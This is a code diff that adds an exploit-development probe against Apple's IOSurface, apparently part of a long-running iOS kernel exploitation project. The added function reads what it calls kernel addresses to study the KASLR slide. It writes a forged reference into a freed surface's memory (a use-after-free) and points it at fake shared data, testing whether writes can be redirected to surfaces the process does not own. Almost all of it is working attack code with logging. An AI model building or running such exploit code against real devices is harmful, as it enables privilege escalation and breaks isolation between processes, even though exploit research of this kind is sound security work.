@@ -16141,6 +16141,374 @@ static void r393_probe(void) {
 }
 
 /*
+ * r401: Kernel address analysis + heap-aligned fake shared data.
+ *
+ * r400 found:
+ *   - shared+88 contains kernel-looking values (0xfffffffe...) that differ per surface
+ *   - shared+136 = surface ID (confirmed)
+ *   - shared+112/120/128 = three userspace pointers
+ *   - Fake shared data on STACK crashed with SIGBUS
+ *
+ * This probe:
+ *   Phase 1: Read shared+88 from 10+ surfaces, check KASLR slide pattern
+ *   Phase 2: Read the userspace structures at +112, +120, +128
+ *   Phase 3: Heap-aligned fake shared data (mmap PAGE_SIZE) with only sid changed
+ *   Phase 4: If Phase 3 works, test redirecting to a surface we DON'T own
+ */
+static volatile int g_r401_crashed = 0;
+static sigjmp_buf g_r401_jmp;
+static void r401_sighandler(int sig) {
+    g_r401_crashed = sig;
+    siglongjmp(g_r401_jmp, 1);
+}
+
+static void r401_probe(void) {
+    rlog("\n=== r401: Kernel Address Analysis + Heap Fake Shared ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (!clientRelease) { rlog("  Missing symbols\n"); return; }
+
+    struct sigaction sa401, old_bus401, old_segv401;
+    memset(&sa401, 0, sizeof(sa401));
+    sa401.sa_handler = r401_sighandler;
+    sa401.sa_flags = 0;
+    sigaction(SIGBUS, &sa401, &old_bus401);
+    sigaction(SIGSEGV, &sa401, &old_segv401);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf_=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    /* ---- Phase 1: Kernel address pattern from multiple surfaces ---- */
+    rlog("  Phase 1: Kernel address analysis from 10 surfaces\n");
+
+    IOSurfaceRef surfs[10];
+    for (int i = 0; i < 10; i++) surfs[i] = IOSurfaceCreate(props);
+
+    uint64_t kaddrs[10];
+    uint32_t sids[10];
+    for (int i = 0; i < 10; i++) {
+        uint64_t shared = *(uint64_t*)((uint8_t*)surfs[i] + 8);
+        sids[i] = IOSurfaceGetID(surfs[i]);
+        uint8_t *sp = (uint8_t*)shared;
+
+        g_r401_crashed = 0;
+        if (sigsetjmp(g_r401_jmp, 1) == 0) {
+            kaddrs[i] = *(uint64_t*)(sp + 88);
+            rlog("    surf[%d] sid=%3u shared=%p  +88=0x%016llx\n",
+                i, sids[i], (void*)shared, (unsigned long long)kaddrs[i]);
+        } else {
+            kaddrs[i] = 0;
+            rlog("    surf[%d] CRASHED reading +88\n", i);
+        }
+    }
+
+    /* Analyze the pattern */
+    rlog("\n    Address deltas (consecutive):\n");
+    for (int i = 1; i < 10; i++) {
+        if (kaddrs[i] && kaddrs[i-1]) {
+            int64_t delta = (int64_t)(kaddrs[i] - kaddrs[i-1]);
+            rlog("    [%d]→[%d]: delta=%lld (0x%llx)\n",
+                i-1, i, (long long)delta, (unsigned long long)delta);
+        }
+    }
+
+    /* Check if these look like kernel text addresses */
+    if (kaddrs[0]) {
+        uint64_t a = kaddrs[0];
+        rlog("\n    First address: 0x%016llx\n", (unsigned long long)a);
+        rlog("    Top 2 bytes: 0x%04llx\n", (unsigned long long)(a >> 48));
+        /* On iOS, kernel text is typically at 0xfffffff007xxxxxx with KASLR slide */
+        /* These 0xfffffffe addresses are unusual — may be IOKit user client addresses */
+        /* or physical addresses */
+        uint64_t maybe_offset = a & 0x00000000FFFFFFFFULL;
+        rlog("    Low 32 bits: 0x%08llx\n", (unsigned long long)maybe_offset);
+
+        /* Check relationship to surface IDs */
+        int64_t addr_to_sid_ratio = (int64_t)kaddrs[0] / (int64_t)sids[0];
+        rlog("    Addr/sid[0] ratio: %lld\n", (long long)addr_to_sid_ratio);
+    }
+    fflush(stdout);
+
+    /* ---- Phase 2: Read userspace structures at +112, +120, +128 ---- */
+    rlog("\n  Phase 2: Userspace pointer targets in shared data\n");
+
+    uint64_t sharedA = *(uint64_t*)((uint8_t*)surfs[0] + 8);
+    uint8_t *spA = (uint8_t*)sharedA;
+
+    uint64_t ptr112 = *(uint64_t*)(spA + 112);
+    uint64_t ptr120 = *(uint64_t*)(spA + 120);
+    uint64_t ptr128 = *(uint64_t*)(spA + 128);
+
+    rlog("    shared+112 = %p\n", (void*)ptr112);
+    rlog("    shared+120 = %p\n", (void*)ptr120);
+    rlog("    shared+128 = %p\n", (void*)ptr128);
+
+    /* Dump what +112 points to (likely IOKit connection data) */
+    rlog("\n    *+112 (first 64 bytes):\n");
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        uint8_t *p = (uint8_t*)ptr112;
+        for (int off = 0; off < 64; off += 8) {
+            uint64_t v = *(uint64_t*)(p + off);
+            rlog("      +%2d: 0x%016llx", off, (unsigned long long)v);
+            uint32_t lo = (uint32_t)v;
+            if (lo > 0x100 && lo < 0x10000 && (lo & 3) == 3) rlog("  <mach port?>");
+            if (v >= 0x100000000ULL && v < 0x200000000ULL) rlog("  <uptr>");
+            rlog("\n");
+        }
+    } else {
+        rlog("      CRASHED: sig %d\n", g_r401_crashed);
+    }
+
+    rlog("\n    *+120 (first 64 bytes):\n");
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        uint8_t *p = (uint8_t*)ptr120;
+        for (int off = 0; off < 64; off += 8) {
+            uint64_t v = *(uint64_t*)(p + off);
+            rlog("      +%2d: 0x%016llx", off, (unsigned long long)v);
+            uint32_t lo = (uint32_t)v;
+            if (lo > 0x100 && lo < 0x10000 && (lo & 3) == 3) rlog("  <mach port?>");
+            if (v >= 0x100000000ULL && v < 0x200000000ULL) rlog("  <uptr>");
+            rlog("\n");
+        }
+    } else {
+        rlog("      CRASHED: sig %d\n", g_r401_crashed);
+    }
+
+    rlog("\n    *+128 (first 64 bytes):\n");
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        uint8_t *p = (uint8_t*)ptr128;
+        for (int off = 0; off < 64; off += 8) {
+            uint64_t v = *(uint64_t*)(p + off);
+            rlog("      +%2d: 0x%016llx", off, (unsigned long long)v);
+            uint32_t lo = (uint32_t)v;
+            if (lo > 0x100 && lo < 0x10000 && (lo & 3) == 3) rlog("  <mach port?>");
+            if (v >= 0x100000000ULL && v < 0x200000000ULL) rlog("  <uptr>");
+            rlog("\n");
+        }
+    } else {
+        rlog("      CRASHED: sig %d\n", g_r401_crashed);
+    }
+    fflush(stdout);
+
+    /* ---- Phase 3: Heap-aligned fake shared data ---- */
+    rlog("\n  Phase 3: Heap-aligned fake shared data test\n");
+
+    IOSurfaceRef surfTest = IOSurfaceCreate(props);
+    IOSurfaceRef surfTarget = IOSurfaceCreate(props);
+    IOSurfaceRef surfVictim = IOSurfaceCreate(props);
+    uint32_t sidTest = IOSurfaceGetID(surfTest);
+    uint32_t sidTarget = IOSurfaceGetID(surfTarget);
+    uint32_t sidVictim = IOSurfaceGetID(surfVictim);
+    rlog("    Test=%u Target=%u Victim=%u\n", sidTest, sidTarget, sidVictim);
+
+    uint64_t sharedTest = *(uint64_t*)((uint8_t*)surfTest + 8);
+    uint64_t sharedTarget = *(uint64_t*)((uint8_t*)surfTarget + 8);
+
+    /* Allocate page-aligned heap buffer for fake shared data */
+    void *fakeShared = mmap(NULL, 16384, PROT_READ|PROT_WRITE,
+                            MAP_PRIVATE|MAP_ANON, -1, 0);
+    if (fakeShared == MAP_FAILED) {
+        rlog("    mmap failed: %s\n", strerror(errno));
+        goto r401_cleanup;
+    }
+    rlog("    Fake shared mmap'd at %p (page-aligned)\n", fakeShared);
+
+    /* Copy surfTest's ENTIRE shared data (use 4096 to be safe) */
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        memcpy(fakeShared, (void*)sharedTest, 4096);
+        rlog("    Copied 4096 bytes of shared data\n");
+    } else {
+        rlog("    CRASHED copying shared data: sig %d\n", g_r401_crashed);
+        goto r401_unmap;
+    }
+
+    /* Test 1: Unmodified copy — should still route to Test's surface */
+    uint8_t dataTest[512], dataVictim[512];
+    memcpy(dataTest, (void*)surfTest, 512);
+    memcpy(dataVictim, (void*)surfVictim, 512);
+
+    uintptr_t freedVictim = (uintptr_t)surfVictim;
+    clientRelease(surfVictim);
+
+    uint8_t testRef[512];
+    memcpy(testRef, dataTest, 512);
+    *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+    memcpy((void*)freedVictim, testRef, 448);
+
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        int v = 0xBEEF;
+        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+        IOSurfaceSetValue(surfVictim, CFSTR("HeapFake1"), nv);
+        CFRelease(nv);
+        CFTypeRef rv = IOSurfaceCopyValue(surfTest, CFSTR("HeapFake1"));
+        rlog("    Test 1 (unmodified copy): route to Test? %s\n", rv ? "YES" : "no");
+        if (rv) { IOSurfaceRemoveValue(surfTest, CFSTR("HeapFake1")); CFRelease(rv); }
+    } else {
+        rlog("    Test 1 CRASHED: sig %d\n", g_r401_crashed);
+        rlog("    Cannot use fake shared data — aborting Phase 3\n");
+        goto r401_unmap;
+    }
+
+    /* Test 2: Change ONLY surface ID (+136) to Target's sid */
+    rlog("\n    Test 2: Change only sid in fake shared → Target\n");
+    *(uint32_t*)((uint8_t*)fakeShared + 136) = sidTarget;
+
+    memcpy(testRef, dataTest, 512);
+    *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+    memcpy((void*)freedVictim, testRef, 448);
+
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        int v = 0xCAFE;
+        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+        IOSurfaceSetValue(surfVictim, CFSTR("SidOnly"), nv);
+        CFRelease(nv);
+
+        CFTypeRef rvTest = IOSurfaceCopyValue(surfTest, CFSTR("SidOnly"));
+        CFTypeRef rvTarget = IOSurfaceCopyValue(surfTarget, CFSTR("SidOnly"));
+        rlog("    Test? %s  Target? %s\n",
+            rvTest ? "YES" : "no", rvTarget ? "YES" : "no");
+        if (rvTarget) {
+            rlog("    *** SID CHANGE ALONE REDIRECTS TO TARGET ***\n");
+            rlog("    *** ARBITRARY SURFACE TARGETING ACHIEVED ***\n");
+            IOSurfaceRemoveValue(surfTarget, CFSTR("SidOnly"));
+            CFRelease(rvTarget);
+        }
+        if (rvTest) {
+            rlog("    (Still routes to Test — sid not sufficient)\n");
+            IOSurfaceRemoveValue(surfTest, CFSTR("SidOnly"));
+            CFRelease(rvTest);
+        }
+    } else {
+        rlog("    Test 2 CRASHED: sig %d\n", g_r401_crashed);
+    }
+
+    /* Test 3: Change sid AND the kernel ptr at +88 to Target's values */
+    rlog("\n    Test 3: Change sid + kernel ptr → Target\n");
+    *(uint32_t*)((uint8_t*)fakeShared + 136) = sidTarget;
+
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        uint64_t targetKptr = *(uint64_t*)((uint8_t*)sharedTarget + 88);
+        *(uint64_t*)((uint8_t*)fakeShared + 88) = targetKptr;
+        rlog("    Set +88 to Target's value: 0x%016llx\n", (unsigned long long)targetKptr);
+    } else {
+        rlog("    CRASHED reading target's +88\n");
+        goto r401_unmap;
+    }
+
+    memcpy(testRef, dataTest, 512);
+    *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+    memcpy((void*)freedVictim, testRef, 448);
+
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        int v = 0xD00D;
+        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+        IOSurfaceSetValue(surfVictim, CFSTR("SidKptr"), nv);
+        CFRelease(nv);
+
+        CFTypeRef rvTest = IOSurfaceCopyValue(surfTest, CFSTR("SidKptr"));
+        CFTypeRef rvTarget = IOSurfaceCopyValue(surfTarget, CFSTR("SidKptr"));
+        rlog("    Test? %s  Target? %s\n",
+            rvTest ? "YES" : "no", rvTarget ? "YES" : "no");
+        if (rvTarget) {
+            rlog("    *** SID+KPTR REDIRECTS TO TARGET ***\n");
+            IOSurfaceRemoveValue(surfTarget, CFSTR("SidKptr"));
+            CFRelease(rvTarget);
+        }
+        if (rvTest) {
+            IOSurfaceRemoveValue(surfTest, CFSTR("SidKptr"));
+            CFRelease(rvTest);
+        }
+    } else {
+        rlog("    Test 3 CRASHED: sig %d\n", g_r401_crashed);
+    }
+
+    /* Test 4: Change ALL 6 differing fields to Target's values */
+    rlog("\n    Test 4: Change all 6 differing fields → Target\n");
+
+    /* Reset fake shared to Test's data */
+    memcpy(fakeShared, (void*)sharedTest, 4096);
+
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        int diffoffs[] = {88, 112, 120, 128, 136, 232};
+        for (int i = 0; i < 6; i++) {
+            int off = diffoffs[i];
+            uint64_t tv = *(uint64_t*)((uint8_t*)sharedTarget + off);
+            *(uint64_t*)((uint8_t*)fakeShared + off) = tv;
+            rlog("    Set +%d to 0x%016llx\n", off, (unsigned long long)tv);
+        }
+    } else {
+        rlog("    CRASHED copying target fields\n");
+        goto r401_unmap;
+    }
+
+    memcpy(testRef, dataTest, 512);
+    *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+    memcpy((void*)freedVictim, testRef, 448);
+
+    g_r401_crashed = 0;
+    if (sigsetjmp(g_r401_jmp, 1) == 0) {
+        int v = 0xF00D;
+        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+        IOSurfaceSetValue(surfVictim, CFSTR("AllFields"), nv);
+        CFRelease(nv);
+
+        CFTypeRef rvTest = IOSurfaceCopyValue(surfTest, CFSTR("AllFields"));
+        CFTypeRef rvTarget = IOSurfaceCopyValue(surfTarget, CFSTR("AllFields"));
+        rlog("    Test? %s  Target? %s\n",
+            rvTest ? "YES" : "no", rvTarget ? "YES" : "no");
+        if (rvTarget) {
+            rlog("    *** ALL-FIELDS CHANGE REDIRECTS TO TARGET ***\n");
+            IOSurfaceRemoveValue(surfTarget, CFSTR("AllFields"));
+            CFRelease(rvTarget);
+        }
+        if (rvTest) {
+            IOSurfaceRemoveValue(surfTest, CFSTR("AllFields"));
+            CFRelease(rvTest);
+        }
+    } else {
+        rlog("    Test 4 CRASHED: sig %d\n", g_r401_crashed);
+    }
+    fflush(stdout);
+
+r401_unmap:
+    munmap(fakeShared, 16384);
+r401_cleanup:
+    sigaction(SIGBUS, &old_bus401, NULL);
+    sigaction(SIGSEGV, &old_segv401, NULL);
+
+    for (int i = 0; i < 10; i++) CFRelease(surfs[i]);
+    CFRelease(surfTest);
+    CFRelease(surfTarget);
+    CFRelease(props);
+
+    rlog("\n=== r401 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r400: Shared data structure reverse engineering.
  *
  * BREAKTHROUGH from r399: The +8 field in the IOSurface client ref is a
@@ -63989,6 +64357,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 404) {
+            rlog("*** rounds=404: Kernel Address Analysis + Heap Fake Shared ***\n");
+            rlog("  Multi-surface +88 pattern, pointer targets, heap-aligned fake shared.\n\n");
+            fflush(stdout);
+            r401_probe();
+            goto done;
+        }
         if (rounds == 403) {
             rlog("*** rounds=403: Shared Data Structure Reverse Engineering ***\n");
             rlog("  Dump +8 target, compare per-surface fields, fake shared data routing.\n\n");
@@ -66402,7 +66777,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
